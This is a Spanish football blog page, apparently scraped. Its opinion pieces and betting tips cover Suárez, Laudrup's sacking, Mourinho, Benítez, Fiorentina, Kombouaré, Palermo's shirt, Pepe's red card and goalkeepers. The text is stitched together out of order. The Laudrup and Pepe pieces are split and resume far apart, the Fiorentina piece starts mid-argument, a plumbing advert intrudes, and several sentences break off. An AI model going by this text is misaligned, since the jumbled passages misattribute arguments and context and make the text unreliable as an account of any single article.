Marca Eden Hazard. Cuota 3.50. Stake 5.3) West Ham – Manchester United. Ganan los de David Moyes. Cuota 1.83. Stake 10. Las apuestas de Ramón Flores1) Combinada (Chelsea-Galatasaray, gana Chelsea; Manchester United-Olympiakos, gana United) Cuota final=1.97 Stake 5 GANADA 2) Real Madrid-Schalke, saca el Madrid al menos 7 córners. Cuota 2.00. Stake 5 GANADA Como a Pol, la Champions me salva el cuello. Aposté por la mítica Premier de los ingleses en casa y tal, y muy raro hubiera sido que el Madrid no hubiera cumplido con una buena cuota de córners frente al Schalke de derribo de las últimas semanas. Como la táctica ha funcionado, nos jugaremos algo similar con el City-Fulham, a priori uno de los partidos más desequilibrados de la jornada. Por otra parte, combinamos la ya clásica victoria del Bayern, que por jugar fuera tiene una cuota aceptable, con victoria del Athletic, que está en pleno subidón moral y además recibe al alicaído Getafe.1) Manchester City-Fulham. Al menos 8 córners para el City. Cuota 1.65. Stake 5.2) Mainz-Bayern victoria visitante combinada con Athletic-Getafe victoria local. Cuota 1.69. Stake 5. Hay una imagen extraña del delantero uruguayo Luis Suárez como barcelonista. O la había, al menos, hasta el pasado sábado por la tarde. En su vuelta al fútbol real, tras cumplir con los cuatro meses de sanción que la FIFA decidió imponerle tras su affaire mundialista con Giorgio Chiellini, el barcelonismo pudo por fin comprobar que su fichaje estrella de la presente temporada existe y es de verdad. Porque durante el tiempo transcurrido desde que se anunciara su contratación por parte del FC Barcelona y su esperada vuelta al terreno de juego en partido oficial, Suárez deambuló como alma en pena sobrevolando el imaginario azulgrana como un refuerzo inexistente. Convertido en una incógnita rodeada de ciertos síntomas certeza que no hacían sino acrecentar la ansiedad por ver llegar el momento de su estreno.Luis Suárez se convirtió el sábado, a eso de las seis de la tarde, en una realidad para el barcelonismo. Superó su triste y pesado deambular por ese lugar imaginario en el que uno redime sus pecados y se presentó en el Bernabéu vestido de corto y azulgrana para redondear, junto a Messi y Neymar, un ataque que promete sartenadas de goles y virtuosismo ofensivo para regalar. Dejó bien pronto muestras de su exquisito nivel, cuando desequilibró el eje defensivo madridista con un atinado cambio de juego de derecha a izquierda, templado y mimoso, para habilitar a Neymar en el gol culé. Apenas había tocado un par de balones. No necesitó más. Pero tampoco pudo hacer más. Mermado en sus condiciones físicas tras la prolongada inactividad, Suárez se diluyó como el resto de sus compañeros ante las embestidas madridistas. Así como únicamente precisó de tres minutos de juego para tirar de colocar un balón donde el desarrollo de la jugada lo pedía, la exigencia del más alto ritmo competitivo acabó demostrando que al uruguayo aún le resta mucho, en lo físico y en lo que a  para ser el futbolista decisivo y voraz que el barcelonismo espera. De momento, para ir empezando y abriendo boca, al menos es ya un futbolista real. En la tarde de ayer martes, el Swansea City anunciaba la destitución de Michael Laudrup como técnico del conjunto galés. La noticia cayó con cierta dosis de sorpresa, al menos fuera del entorno del Liberty Stadium. Actual campeón de la Capital One Cup, y con vida en las actuales ediciones coperas además de en la Europa League, el Swansea se mantiene en una posición de cierta holgura con respecto al descenso. Son apenas dos puntos de colchón, pero con muchos equipos involucrados de por medio. La situación deportiva, por más que los Swans hayan conseguido ganar únicamente en dos de sus últimos ocho encuentros, no parecía tan catastrófica como para dejar caer la guillotina, máxime tratándose de un club en pleno proceso de crecimiento tras su ascenso a la Premier League hace ahora tres temporadas.La sensación de que Michael Laudrup se había convertido en un elemento extraño para la directiva galesa cobra fuerza ante el anuncio de su despido.Hoy nadie habla de un partido brillante como fue la vuelta de la Supercopa, sino del dedo en el ojo, del ‘pito vilanova’ y de la entrada de Marcelo a Fábregas. Y es normal, porque si algo hemos aprendido en estos últimos clásicos es que lo que rodea al fútbol llama más la atención que el propio fútbol. Parece haber un culpable: Mourinho. El portugués es un provocador de manual, desafiante, irónico y lenguaraz. Aún no sabemos si para disimular las carencias del equipo o para conseguir desequilibrar a los rivales. Un juego más antiguo que el propio fútbol pero que parece no sentar bien a los defensores del señorío merengue.Insisto, es injustificable la chabacanería de Mourinho pero aplaudir la lapidación me inquieta. La sensación, tras este año de duelos directos contra el Barcelona es que el Madrid está fuera de órbita. Descentrado, apabullado, siniestramente ido. Tiene talento pero poca elegancia, tiene cerebros marchitos dentro de buenos jugadores. Coquetea con la vulgaridad y todo este alarde de hormona y entradas a destiempo empieza a cansar, y más si no es resultado de victorias sino de deshonrosas derrotas como la de anoche. Existe una creencia ridícula sobre cómo vencer al Barça. Lo he oído y leído en estos meses. Se supone que a un equipo de ballet como el azulgrana sólo se le puede vencer con la presión, la dureza y el jaleo. Parece que su entrenador piensa igual, lo cierto es que los jugadores salen al campo sobremotivados, excesivos. Humildemente pienso que el Madrid tiene fútbol para ganar al Barcelona con fútbol. Tiene jugadores certeros, un toque de balón aseado y algunos hombres claves en sus puestos. No es imposible salir al campo a jugar al fútbol sin alardes ni masculinidad.Este estado de cosas ha convertido al Barcelona en una víctima de la furia madridista. Ellos ponen fútbol y el Madrid pone juego duro. No es tan así, desde luego, pero esta descorazonadora apuesta de Mourinho está fomentando esta idea que se ha instalado en el inconsciente colectivo del aficionado. El portugués es un buen estratega pero el equipo parece haber perdido el norte. La calculadísima elegancia de Guardiola deja en pañales la arenga permanente de Mourinho, sus plantes a la prensa y su excitación y cinismo. La rueda de prensa de ayer puede pasar por un auténtico anecdotario del disparate. Insisto, me cuesta posicionarme. Confieso ser un amante de ese otro fútbol, del campo de tierra, del juego férreo. Pero el resumen de ayer no pasa por convertir al Madrid en un equipo duro de los respetados sino en una pandilla de enloquecidos sin más argumentos que cazar al rival para esconder las carencias.Decía que el madridismo como sentimiento está en crisis. Cogerle cariño a un equipo empequeñecido es complicado. Hay mucho oportunista que saca a relucir el señorío cuando, precisamente, siempre lo han puesto en cuestión y han hablado de él como un rescoldo añejo. Ayer Mourinho se volvió a pasar de la línea. No es la primera vez y en este estado de excitación no creo que sea la última. Espero que empiece la Liga para ver si todo se calma, para ver si todo vuelve a su cauce, para que el Real Madrid empiece a rodar y no se pierda por las sórdidas rutas que el entrenador portugués está señalando en el mapa. “No lloréis, que me voy a casar con ella” o algo parecido dijo Florentino Pérez la última vez que habló de Benítez. Las dudas sobre el equipo estaban más que razonadas. El Real Madrid jugaba con la claridad de una ciénaga, con la rapidez de un mueble-bar, con la intensidad de una funcionaria de Correos, con la delicadeza de un carlino mojado. Y lo peor es que se veía venir ya desde verano. En el Real Madrid, como en Gran Hermano, todo se magnifica.A Benítez parece que lo habían elegido porque pasaba por allí. No estaba en su mejor momento tras su nebuloso paso por el Nápoles. En su momento tuvo fama de estudioso del fútbol, de cerebro privilegiado, de estratega. Eran tiempos mejores, los del Valencia y el Liverpool, cuando parecía que el viejo entrenador boronatiano, zabalciano, griguoliano, vidaliano, d´alessandriano… había pasado de moda.Eran momentos de pizarras cibernéticas, de telemetrías, de largas sesiones de vídeo, de cuando la Premier era el paradigma de no sé qué. Ahí Rafa se comió, sin segundas, un buen trozo de pastel. Aportaba algo nuevo y los resultados le amparaban. Los periodistas hablaban del ´método Benítez´, los dominicales visitaban ´su laboratorio en Inglaterra´ e intuyo que media Europa se peleaba por él en los despachos. Después pasó la moda, como pasó Perotti, Anquela, Michu o el calvo del Mirandés; como pasan las cosas en el fútbol: rápidas e inmisericordes. Tiempos grises en el Inter. Un Nápoles que apuntó a más de lo que pudo cazar y Benítez terminó pareciéndonos quizá lo que siempre fue: un resultadista para los aficionados y un pesado para sus jugadores.La llamada del Madrid le tuvo que sentar como un match del Tinder.Concretezza. La zaga, con Gonzalo Rodríguez al mando, Tatarusanu en la portería y Marcos Alonso en la banda zurda está firmando un año excelente. Y arriba, dos delanteros en estado de gracia. Rápidos, físicos y resolutivos en el área. El fijo es Kalinic, con 10 goles en todas las competiciones, pero Babacar le secunda bien con 5. El croata, con cara de sellar documentos de 9 a 5 en algún oscuro ministerio, esconde más fútbol del esperado bajo esa jeta funcionarial. Lo suyo es la caña pero no sólo. Se asocia, sabe sacar a los centrales de lugar con su movilidad y marca diferencias de cara y de espaldas. La prueba es que solo la Roma, con 30, iguala los goles del conjunto morado. Y todavía falta el concurso de Rossi…Por detrás del killer, ver a la Fiorentina dibujando triángulos cerca del área te sigue salvando la tarde. La personalidad y capacidad de mejorar jugadas de Borja Valero, la calidad de Josip Ilicic para el último pase y el talento nítido, pujante, de Bernardeschi te obligan a preparar palomitas a las tres de la tarde. Además se están aprovechando del enorme salto de Marcos Alonso, supervitaminado esta temporada por si Del Bosque tiene a bien recordar que hay un equipo morado donde juegan varios españoles buenos. El hijo y nieto peina la banda zurda y es un peligro constante en los centros y en los lanzamientos a balón parado.Volviendo a Bowie, acertar la siguiente alineación de Paulo Sousa está suponiendo un reto semanal para el periodismo. Un acierto que todos los cromos sean útiles, que haya pocos ‘colocas’ pese a los resbalones. Esa política le ha servido al portugués para aprovecharse puntualmente, con cuentagotas, de los talentos aparentemente relegados de Mario Suárez (golazo frente al Frosinone), de Rebic o de Babacar. Están brillando varios futbolistas importantes, pero la diferencia la hace el grupo. No hace falta explicar la importancia del armario en un campeonato tan físico (y tan abierto esta temporada) como el italiano.Los toscanos ya se han enfrentado a Inter (1-4 en el Meazza), Milan, Roma y Nápoles. Pocos ven a una Fiorentina campeona, su techo son los puestos Champions, y ahora llega el derbi contra una Juventus lanzada, pero el panorama es más que favorable para pensar en que este artículo seguirá teniendo vigencia dentro de un mes.Puedes comprar camisetas de la Fiorentina, con un amplio y completo muestrario, en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. De la pandilla que se juntaba cada mañana en el Café de la Forêt de Saint-Germain a principios de los noventa, Alain Roche, David Ginola, Paul Le Guen, Vincent Guerin, Laurent Fournier, Bernard Lama, o Daniel Bravo, el defensa del PSG Antoine Kombouaré era posiblemente el menos dotado. Uno se lo imagina, entre café y café, ilustrando sus futuras hazañas ante el catálogo de fenómenos que allí se reunían y casi puede escuchar las risotadas. Aunque hayan pasado más de veinte años. Sin embargo Kombouaré héroe, eliminaba en cuartos de la UEFA al Madrid de Benito Floro en el que los hinchas parisinos consideran el partido más bello de su historia. Y casi dos décadas después Kombouaré entrenador, lidera la resurrección del PSG en el campeonato francés. Bendita casualidad.Resulta curiosa la evolución de Antoine Kombouaré a ojos del aficionado francés. Cuando llega de Nueva Caledonia a Nantes con 20 años es un defensa tosco de 185 centímetros y cien kilos al que apodan kanak, perro grande. Para 1995, cuando abandona el PSG, el mostrenco es un cromo imperdible en la imaginería del club parisino conocido como Casco de Oro. Entre medias se puede decir que moldeó la semántica a testarazos. Casco de oro nace un 18 de marzo de 1993 y una vez repasados los hechos solo cabe reconocer que el sobrenombre es más que merecido. Cuartos de final de la Copa de la UEFA. El PSG, que venía jugando como los ángeles con Ginola, Valdo y George Weah en estado de gracia, buscaba la machada ante el Real Madrid de Floro en un Parque de los Príncipes eléctrico. ¿En el debe? Una candidez tal que les había hecho regresar del Bernabéu con un sonoro 3-1 en la mochila pese a un buen juego más que palpable. Por contra, quien lo iba a decir 20 años atras en el Café de la Forêt, tenían en su equipo a Kombouaré.Recuerdo que aquel día el PSG salió en tromba. Cosa rara, Artur Jorge había cambiado el sistema para acomodar un ataque de tres puntales como Ginola, Weah y Amara Simba. Y la cosa funcionaba como una apisonadora hasta que Valdo burló a Rocha y mandó la pelotita a la red por vez tercera. El 3-0 daba la clasificación ante al Grand Real Madrid. “Estaba hecho. Sentimos una alegría enorme pensando que ya estábamos clasificados”. recuerda Kombouaré. Pero entonces, justo cuando el equipo se ablanda lo suficiente, para Zamorano deja al estadio en coma con un gol postrero. 3-1 y la prórroga servida. Con los dos equipos resignados a bailar en el alambre de la prolongación a Sandor Pulh se le ocurre añadir cinco minutos y entonces nace el héroe. Ginola gana un tiro libre en la frontal que Valdo envenena con la maestría acostumbrada. Nadie lo espera pero Kombouaré, que ya había dado el pase a cuartos frente al Anderlecht con otro testarazo oportuno, hace bueno el centro y París estalla. “Recuerdo querer llegar a ese balón más que nada en el mundo. Le pegue con todo”L’Equipe tituló al día siguiente “La felicidad total” y pese a que aquel PSG no levantara finalmente el título la hazaña fue recordada durante años. No se había visto cosa igual, eliminar a todo un Real Madrid, desde los buenos tiempos del Saint Etienne en los setenta. Incluso fuera de Francia muchos asociamos PSG a buen fútbol por aquellos momentos. Las palabras del protagonista lo confirman. “Ese fue el gol de una generación, una dedicatoria a mis compañeros, a la banda del Café de la Forêt”. Kombouaré, contra todo pronóstico que flotara en aquellas matinales, devenía en Casco de oro, escribiendo una página gloriosa en la memoria del club. Cerca de veinte años después quiere continuar escribiendola. Albañilería, fontanería y electricidad. ¡24 horas a su servicio! Ron Harper siempre daba el callo en los mejores Bulls de Jordan y Andrés Montes le reconocía los sudores con una frase inmortal.Lloró en la presentación  y no digo yo que un hombre no pueda llorar, pero me sorprendió que un profesional ante un reto laboral mostrara tan ostentosamente que estar ahí era algo con lo que no contaba, algo que le había embargado hasta el punto de no poder contenerse con el jefe delante.A partir de ahí una hostia detrás de hostia. Como en una película de Bud Spencer en la que el único aliciente era ver como se endiñaban. Antes la gente iba al cine a esas cosas. Pagaban entradas por ver a un gordo con barba pegar a tipos disfrazados de vaqueros. A los del plano secuencia se lo digo. Quizá entendamos que el fútbol es un poco eso, llamar cine a noventa minutos de golpes. Llamar información deportiva a veinticinco minutos de críticas a un entrenador. La sensación es que prensa y afición han ido a dar con Benítez. El equipo no pintaba bien, pero en peores plazas ha toreado el Madrid. Sin embargo, el descoque general ha sido inentendible y un factor más en la cuestionada imagen del Madrid en lo que va de temporada.En definitiva: el Madrid se deshacía y el Barcelona y el Atleti no perdían el ritmo. Lo de casi siempre. Una fase de grupos aseada en Europa y a aguantar el chaparrón. Pero, sea o no culpa del entrenador –que yo creo que en parte lo es-, lo cierto es que el Madrid en su conjunto da síntomas de desorden e inconsistencia. El chiste de Cádiz, los excesos de velocidad, las bobaditas de Cristiano con el PSG, el fax de De Gea y las derrotas; todo se mezcla y no parece Benítez un hombre capaz de calmar los ánimos, aislar a la plantilla, demostrar en el campo que todo es accesorio menos el propio fútbol.Escribo esto porque leo que van a echar a Benítez esta misma tarde. Zidane es como un yogur en la nevera que aunque no te apetezca, te obligas a comer antes de que caduque. ¿Por qué no se apostó directamente por el francés a principio de temporada? Habrá que preguntárselo a Florentino. El innombrable. Si Florentino es Voldemort, Butragueño es Snape. Entre los dos llevan tapando agujeros desde que empezó la temporada. Silbando como si nada mientras veían que su club avanzaba a trompicones. “El Madrid nunca hace el ridículo”, dijo Emilio tras lo de Cherysev. Y me gustó su firmeza. Aunque ahora tiene que inventar una nueva palabra para describir lo de Copa.Y pese a todo: el Madrid está en octavos, a distancia alcanzable del líder en Liga y fuera de la Copa exclusivamente por problemas administrativos, no deportivos. Pero el pulgar enfila la cuesta abajo. El dedo ejecutor de un presidente que no sabe distinguir entre un club y un equipo. Florentino Pérez,  el capitán de un barco hecho con maderos podridos pero con velas de seda y timón de oro.Se irá Benítez como se fue Ancelotti y antes Del Bosque, Queiroz, Luxemburgo o Pellegrini. Porque no puede cambiar a la plantilla entera, se echa al entrenador. Eso dice una máxima futbolera. Y aquí huele a eso, a que hay muchas estrellas pero no pueden verse con la contaminación lumínica. A que todo está enmarañado de puertas para adentro en un vestuario roto que no sabe a qué juega, o que no quiere jugar a lo que le mandan, o que van al Madrid como quien va al McDonald: a hincharse de todo, pero que nadie les mande recoger las bandejas.No me da pena Benítez, pese a sus tiernas lágrimas veraniegas. No me alegro por Zidane, porque solo el tiempo dirá si además de ser un genio dentro del rectángulo lo será en las zonas aledañas.Una que me vale para Franck Omgba. Las cámaras no lo recogieron pero cuando el árbitro pitó por primera vez, el camerunés anudó las cuatro esquinas del pañuelo que llevaba a la cabeza. Después se escupió parsimoniosamente las palmas de las manos y localizó el primer balón dividido. Ya había fichado y tocaba tajo.La vida es dura trabajando en el carbón, pero más si te toca Omgba enfrente cuando tiene el día pegajoso. En Tenerife fue cola industrial. Fue el japonés al que Chiquito de la Calzada le daba la mano dos veces. Si el Oviedo amarró la primera victoria a domicilio de la Liga Hummel presionando lo más arriba que pudo y arrimando la pierna, Omgba fue la personificación del discurso. El mediocentro africano no sirve para abrir autopistas, no es Héctor Font, pero cava trincheras que es gloria bendita.El despliegue del camerunés y la escoba de Erice, la precisión de Susaeta a balón parado y el oportunismo intacto de Linares. El equipo da la razón a los que veían mimbres de Segunda en la plantilla de la temporada pasada. Mimbres, al menos, para no pasar apuros. Sin alardes, es cierto, y aprovechándose de un Tenerife todo desorganización y ansiedad, al Oviedo le funcionó en el Heliodoro la misma receta que valía en el infrafútbol. Solidaridad, intensidad y dinamita arriba. Borja Valle, Susaeta y Hervías ocuparon con inteligencia los espacios detrás de Linares, tanto para crear como para ayudar a destruir y eso fue demasiado para un Tenerife incapaz de descolocar a los azules. Esteban, con un par de intervenciones de mérito, termino de agotar las opciones isleñas.En el minuto 52, las cámaras descubrieron a un aficionado del Tenerife ondeando una camiseta del Sporting; acto seguido marcaba Borja Valle el segundo pariendo un gif magistral para esta época de información basura. Forever alone, owned, EPIC FAIL, zas en toda la boca y todas las chorradas que se te ocurran. Interpreto la buena victoria del Oviedo ante un flojísimo Tenerife como hago con los vídeos graciosos. Me río a carcajadas, los disfruto como un enano, pero siempre acabo cerrándolos pensando que no tienen la menor importancia. Queda mucho. No quiero activar el modo Pacheta o peor, ¡dejar que me posea el espíritu de Pichi Lucas! , pero esto solo acaba de empezar. El fútbol animal. Frente a un bloque de viviendas en Palermo cuatro chavales se peinan la cresta y se remeten la llamativa camiseta del equipo por debajo del vaquero. Están listos para el cortejo en la noche del suburbio. Sueñan con los rosarios de Cristiano Ronaldo y con los cinturones de Eto’o. Con Balotelli al completo, que es un puto mensaje andante. Con deportivos blancos para rituales extraños. Cien años atrás, en la misma acera, vemos al conde Airoldi escribiéndole una carta al cónsul británico en la ciudad con diversas indicaciones estéticas. Joseph Whitaker, fundador del Palermo y precursor del fútbol en Italia, consiente y obliga al Palermo a vestir de rosa para el resto de su vida. Gente elegante sembrando una semilla anómala. “Estimado Joseph, mis amigos marineros me han contado que los colores del Palermo se utilizan demasiado. El Génova tiene vuestros, nuestros colores. Michele Pojero acordó ayer con el señor Black y con Norman cambiar el rojo y el azul por el rosa y el negro. Michele dice que estos son los colores de lo amargo y lo dulce.” Los soldados de La Favorita marchan a la guerra vestidos de rosa desde entonces.Se quejaba el conde Airoldi en ese manuscrito seminal de que los resultados del Palermo eran demasiado oscilantes. Su salud no era buena e imploraba una victoria a los chicos de Whitaker para calmar en la medida de lo posible sus dolencias. Desde 1902 el equipo no le ha hecho demasiado caso, salvo en esta última época al calor del dinero de Zamparini. Sin embargo, ni los vaivenes deportivos, ni el influjo de la mafia, ni las frecuentes astracanadas institucionales han supuesto cambio alguno en la rara camiseta. De vez en cuando han saboreado el dulce,  la mayoría de días han vuelto a casa amargados, pero siempre lo han hecho con el orgullo de portar un uniforme único.Los chicos del barrio lo celebran, nosotros también.Cada quince días y de la mano de Classic Football Shirts, la tienda online especializada en camisetas antiguas, nos acercamos al fútbol con una perspectiva diferente. Lo hacemos desde las camisetas con las que se ha construido la historia del deporte rey.Puedes comprar todas estas camisetas y cientos más en Classic Football ShirtsEl Madrid ahora es una casa desordenada. Como las de Gran Hermano, claro. A Benítez lo ha echado la audiencia. Pasa en el Madrid como con Gran Hermano, que ya no sabemos exactamente por qué edición va, ni como se llaman los concursantes. Sólo hay una cosa que no falla: está Mercedes Milá como está Florentino Pérez. Es lo único que no cambia. El resto es accesorio. El show en vivo continúa. Mañana volveremos a poner la tele, para ver qué miserias, gritos, alegrías o romances se viven dentro de esas cuatro asfixiantes paredes. Si echan hoy a Benítez, sólo han echado a un concursante más. Entrará otro. A estas alturas, a quién le importa eso. Yo no he abierto el Word así a lo loco, con el partido de Alemania y Portugal aún caliente, para haceros creer que Pepe merece un Nobel de la Paz. Y ojo que tras dárselo a Obama, el jefe de ese país perpetuamente envuelto en conflictos bélicos, bombardeos indiscriminados y ocupaciones interesadas y torticeras, tampoco está el nivel muy alto. Pepe es un defensa excelente con una tendencia incomoda a la violencia –sólo recordar lo de Casquero me produce escalofríos- y cuya capacidad de raciocinio –en el terreno de juego, fuera no podemos opinar demasiado- está siempre en el límite de lo esperable de un jugador de su nivel. Hoy ha sido expulsado en la primera parte del partido debut de su selección. Con dos goles en contra. Por una jugada sin balón. Por buscar a un rival para amedrentarlo. Su equipo se ha quedado vendido. En la nada porque es difícil remontar así, con todo en contra. La acción, animo a que la veáis, no es merecedora de tarjeta. Ni siquiera amarilla. El árbitro ha actuado rápido, sin temple, ajustando cuentas, como un juez que no sabe ser juez, como aquel que administra justicia con lo primero que le viene a la cabeza. Y ese algo es Pepe, y el pasado de Pepe, y las circunstancias, y el currículum, y todo lo que queráis. Pero si algo aprendí –poco- en mis estudios de Derecho fue que no se juzgan los entornos, ni la potencialidad, ni los indicios: se juzgan los hechos. Y los hechos no son merecedores de tarjeta roja.Intentaré poneros un ejemplo que espero entendáis: Juan es un hombre que ha arruinado todas sus parejas por su querencia a la infidelidad. Es sentar la cabeza y a los días ponerse a tontear con otras chicas, sin criterio, sin sentido, sin mesura. Un día Juan conoce a Lucía, y cree haber encontrado a la mujer de su vida. Con ella decide cambiar, volver a ser fiel, pasar el resto de su vida. Cumple disciplinadamente, con cariño, sin pesar. Un día conoce a Sandra, una compañera de trabajo con la que se lleva muy bien. Con la que trata con naturalidad, sin segundas intenciones, y con la que trabajo codo con codo con grandes resultados. Una cosa es que Juan haya engañado antes y otra que tenga un mínimo interés en volver a hacerlo. Su pasado no lo va a obligar a encerrarse en casa, faltaría. Es amable, educado con ella, pero en el momento en el que ve que sus palabras pueden dar pie a otras cosas, para la maquinaria y habla de Lucía, porque la ama. Sandra se enamora de Juan, pese a todo, pese a que Juan le ha dicho, mil veces, que tras Lucía no quiere a nadie. Sandra insiste pero Juan dice que no tiene ojos para nadie que no sea Lucía. Sandra insiste aún más y una noche tras mucho pensarlo, le manda un mensaje al whatsapp –que se han intercambiado por motivos estrictamente laborales- donde dice: “quiero demostrarte lo que te amo”.Su relación con Huw Jenkins, presidente del club, llevaba tiempo deteriorándose sin paliativos. Ya incluso desde la pasada temporada, cuando técnico y directivo se enzarzaron en una disputa dialéctica por la política de refuerzos de los Swans, el desencuentro entre ambas partes parecía evidente. Jenkins no tragaba con un técnico que, pese a que le había llevado al momento más exitoso en la historia del club, no había dejado de generar lo que él consideraba problemas paralelos a lo largo del último año. El despido del preparador danés supone el séptimo cambio de entrenador en lo que se lleva disputado de Premier League 2013/14. Más allá de los motivos del cese, lo que pone en evidencia es que algo está cambiando en el fútbol inglés con respecto a la tradicional paciencia con el inquilino del banquillo. La llegada masiva de capital extranjero a los clubes, la necesidad de recuperar las inversiones de forma casi inmediata por parte de unos dirigentes que, en muchos casos, poco o nada tienen que ver con el mundo del fútbol, y la cada vez más efectiva apertura de puertas a técnicos foráneos importadores en ocasiones de métodos que chocan frontalmente con ciertas convicciones británicas, han terminado por igualar la competición inglesa con el resto de ligas mundiales. Lo apuntaba días atrás Pol Gustems en su artículo sobre las reacciones de Craig Bellamy ante las exigencias del público de Cardiff: Inglaterra parece estar rindiéndose a las máximas impuestas por el fútbol moderno. El que exige resultados por encima de todo. El que no conoce de medios ni largos plazos. Ya ni siquiera en Gran Bretaña. Estas cosas sólo pueden pasar, y muy de cuando en cuando, en Inglaterra. Por eso la temporada 2012/13 del Wigan Athletic merece un recordatorio especial en este repaso a lo que fue el año. El último Wigan de Roberto Martínez fue un equipo de extremos. Un conjunto capaz de sorprender a toda Europa a medida que iba subiendo, peldaño a peldaño, hasta la gran final de la FA Cup para terminar hoyando su cumbre con un uno a cero ante el poderoso Manchester City, al mismo tiempo que no conseguía levantar cabeza en la competición liguera, sucumbiendo en último momento y perdiendo la categoría después de ocho temporadas consecutivas como equipo de Premier League. Se iba un superviviente nato.Pero, para entonces, aquel descenso parecía no tener importancia. No hubo dramatismo, no hubo quejas. No hubo reproches ni hacia jugadores, ni hacia cuerpo técnico, ni hacia la directiva del club porque aquel, pese a todo, era un momento increíblemente feliz para la afición del DW Stadium tras haber conquistado el primer título de su historia sólo unos días antes. Como una especie de brillante epitafio a ocho años de ensueño, a una travesía impensable hace sólo una década. El Wigan ya es historia en la Premier League (y no parece que vaya a recuperar la categoría en poco tiempo), pero su especialísimo adiós será recordado durante años. Y no sólo por sus aficionados. Un gol muy extraño terminó decidiendo un muy extraño partido. Gol extraño porque solo Nacho, muy lejos de su posición habitual en el campo, tuvo fe en un balón que parecía perderse sin remedio por la línea de fondo y porque un golpeo inclasificable del defensor madridista, que no buscaba el premio del gol, terminó por alojar el balón en las redes de Trapp. Y un muy extraño partido porque se lo acabó llevando el equipo que menos méritos acumuló para ello. El Real Madrid hizo aguas ante un Paris Saint-Germain bien plantado sobre el Bernabéu. Si hace dos semanas era el Madrid el que daba una imagen más solvente sobre el césped parisino, esta vez fue el cuadro de Laurent Blanc el que puso las condiciones sobre cómo y por dónde debía de jugarse el partido.Y tan bien interpretaron los franceses las condiciones por ellos mismos impuestas, que el 1-0 final se escapa a toda lógica. Brillantes en la presión cuando perdían el balón y resolutivos cuando lo volvían a encontrar, solo la mala puntería evitó una clara victoria visitante. Jugó esta vez el PSG como lo habría hecho un clásico europeo, de esos de lanza en astillero y adarga antigua, de los que siempre exigen esfuerzo superlativo antes de hincar la rodilla. Con gran peso específico. Con la solvencia y la seguridad del que no se ve inferior a su poderosísimo rival, porque realmente no lo es. Liderado por Ángel Di María, auténtico factor diferencial en un equipo capaz de alinear juntos a Ibrahimovic, Cavani o Matuidi, y aprovechando las continuas superioridades provocadas por la movilidad del argentino, desnudó y dominó a un Madrid inesperadamente tierno y melifluo, muy alejado de los cánones de su entrenador.Encarcelado en el 4-5-1 y desasistido como pocas veces, Cristiano Ronaldo dejó probablemente su peor partido desde que es jugador del Real Madrid. No se recuerda, al menos, un choque con menor incidencia del portugués. En el que tocara menos balones, en el que estuviera tan permanentemente alejado del foco e irremediablemente inédito. Tema delicado cuando se trata de un futbolista que necesita permanente conexión con el epicentro del juego para dar su mejor nivel. Lo de Casemiro, jugador con excelso cartel y favorita del sultán Benítez, merece capítulo aparte. Porque resulta preocupante que el brasileño sea el centrocampista más destacado del Real Madrid partido tras partido. Si se busca hacer daño al rival, Casemiro solo puede ser un complemento, nunca un protagonista ni el futbolista blanco que más señales transmita.Un partido extraño.Un partido con un resultado real que pareció de mentira. Con un Real Madrid muy lejos de lo que se espera de un candidato al título y que supo disfrazar una realidad preocupante, porque realmente nunca llegó a tener el choque bajo su control, bajo la máscara de un gol inaudito. Porteros. Guardametas, arqueros, guardarredes, cancerberos o, la muy sonora y sudamericana, goleros. Gente rara. Gente que vive de destrozar los sueños ajenos, de impedir hazañas y de frustrar cualquier intento de alcanzar la gloria. Seres solitarios, que disfrutan en la soledad y el silencio y se enervan entre las multitudes y los focos. La atención siempre lo más alejada posible de su figura, y gracias.El portero es un personaje tan extraño dentro de un campo de fútbol que no viste camiseta, como el resto. El portero viste jersey. Discreto y sobrio o estrambótico y chillón, pero jersey. Antes de que las marcas deportivas decidiesen uniformar a los porteros de sus equipos y estandarizarlos a todos vistiéndolos con un mismo patrón, el diseño y el colorido del jersey de un determinado guardameta te ayudaba a saber un poco más sobre su personalidad y su estilo bajo los palos. El habitual azul cielo de Oliver Kahn chocaba frontalmente con los disparatados diseños de muchos porteros sudamericanos. Algún motivo, más allá del meramente estilístico, habría.El portero parece que no es amigo de nadie, ni siquiera de sus propios compañeros. Si tiene que echarte una bronca con la que te haga temblar hasta los calzoncillos te la va a echar.Lucía, que está leyendo un libro, alza la vista de las páginas y lo lee por encima de las gafas y acto seguida, sin preguntar a Juan y dando por hecho lo que ha pasado por sus antecedentes –que él, amablemente y con franqueza, le ha contado y del que ha mostrado deseo de huir- le dice que se vaya de su lado, que coja sus cosas y desaparezca de su vida.Vengo a decir que el hecho de que Pepe sea Pepe no le puede, en ningún caso, impedir que sobre el terreno de juego se comporte como cualquier otro compañero. Y saque la mano como todos. Y critique a un rival por simular, o entre abajo, o forcejee en un córner, o se dirija al árbitro para protestar. Y si, haciendo cualquiera de esas cosas que hacen todos los jugadores que están sobre el césped, incumple alguna norma; entonces, y sólo entonces, será expulsado. Como cualquier otro que la incumpla.En caso de duda, Pepe no tenía más intención que la que se ve. En la jugada del partido suelta la mano y Müller simula. Pepe se acerca –mucho, pero nunca impacta, nunca cabecea- y le recrimina la acción. Müller se revuelve y se encaran. Ambos. El árbitro se acerca a Pepe y le expulsa. El acta dirá, no queda otra, que pegó un cabezazo a Müller. En las imágenes se verá que no ha sido así. Que todo es una ficción del juez, una suposición, un castigo desproporcionado para un lance del partido –de los que hay en cada encuentro a pares-. Os leo hablar en Twitter de Pepe y hay cosas que no entiendo. La mesura sobre el campo es la que es. Hay que confiar en los árbitros. Por ser Pepe no es justo tener que “evitar el peligro” porque muchas veces evitarlo es dejar de hacer bien tu trabajo. Buscar a Müller es un error, es una temeridad, pero no es suficiente para echar a un jugador. Quizá de ganarse la vigilancia del árbitro en posteriores jugadas, pero nunca un hecho punible en sí mismo. No se juzga a las personas, se juzgan los hechos. Y el hecho da la razón a Pepe. Está siendo un arbitraje nefasto el de este Mundial. Es, como apuntaba Ramón J. Flores, como si Lovren no pudiera defender de cerca a Fred por miedo a que el japonés inútil y casero pite un penalti.No hay miramientos, no hay condescendencia si le dejas vendido a su suerte. Curiosamente, la posición en la que más destacan las individualidades y las actuaciones personalísimas es la que más firme se aferra al sentido de la colectividad del juego. Pero en realidad, por mucho que la historia siempre termine dibujándolo como un ogro, tener un amigo portero es tener un tesoro. Un preciado salvoconducto gracias al cual te libras de colocarte bajo palos en las pachangas de los jueves. Ahí está él, dispuesto a aburrirse, dispuesto a no tocar el balón, dispuesto incluso a jugarse el físico si es necesario, y no hay ni que convencerle. 